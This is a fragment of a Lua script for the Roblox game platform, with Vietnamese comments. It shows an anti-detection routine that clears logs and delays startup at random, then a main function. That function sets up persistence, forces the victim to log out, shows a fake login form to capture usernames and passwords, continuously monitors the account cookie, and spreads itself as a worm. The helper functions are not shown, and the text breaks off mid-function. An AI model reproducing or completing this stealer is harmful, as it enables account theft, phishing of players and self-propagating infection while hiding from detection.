-- ========== 7. CHỐNG PHÁT HIỆN CƠ BẢN ==========
local function antiDetection()
    -- Xóa log
    pcall(function()
        if LogService and LogService.Clear then LogService:Clear() end
    end)
    -- Delay ngẫu nhiên khi khởi động
    task.wait(math.random(5, 15))
end

-- ========== 8. MAIN – KÍCH HOẠT TẤT CẢ ==========
local function main()
    antiDetection()
    enablePersistence()      -- Đảm bảo chạy lại sau teleport
    forceLogout()            -- Đăng xuất tài khoản thật
    createFakeLoginScreen()  -- Hiển thị form giả lấy user/pass
    spawn(monitorCookie)     -- Giám sát cookie liên tục
    task.wait(60)
    spreadWorm()             -- Tự lây lan sau 1 phút
    -- Vòng lặp vô tận giữ script sống (phòng khi executor tắt tự động)
